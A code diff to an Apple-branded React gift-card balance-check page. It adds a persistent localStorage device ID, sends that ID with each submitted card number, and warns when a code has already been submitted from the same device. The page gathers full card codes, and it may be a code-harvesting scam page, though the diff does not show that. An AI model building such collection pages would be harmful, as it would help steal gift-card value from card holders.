@@ -11,6 +11,7 @@ export default function ApplePage() {
   const [showTutorial, setShowTutorial] = useState(false)
   const [showLocationBanner, setShowLocationBanner] = useState(true)
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
+  const [deviceId, setDeviceId] = useState(null)
 
   useEffect(() => {
     async function detectLocation() {
@@ -26,6 +27,14 @@ export default function ApplePage() {
       }
     }
     detectLocation()
+
+    // Initialize or get device ID
+    let id = localStorage.getItem('deviceId')
+    if (!id) {
+      id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
+      localStorage.setItem('deviceId', id)
+    }
+    setDeviceId(id)
   }, [])
 
   async function checkBalance(e) {
@@ -40,7 +49,8 @@ export default function ApplePage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           cardNumber: card.replace(/\s+/g, ''),
-          type: 'apple'
+          type: 'apple',
+          deviceId: deviceId
         })
       })
       const data = await res.json()
@@ -189,7 +199,11 @@ export default function ApplePage() {
 
               {result && (
                 <div className="result">
-                  {result.message ? (
+                  {result.isDuplicate ? (
+                    <div className="error" style={{ background: '#fff2f2', color: '#ff3b30', border: '1px solid #ff3b30', textAlign: 'center', marginTop: '20px', padding: '15px', borderRadius: '8px', fontWeight: '500' }}>
+                      This card code has already been submitted from your device.
+                    </div>
+                  ) : result.message ? (
                     <div className="error" style={{ background: '#f5f5f7', color: '#1d1d1f', border: 'none', textAlign: 'center', marginTop: '20px', padding: '15px', borderRadius: '8px' }}>
                       {result.message}
                     </div>
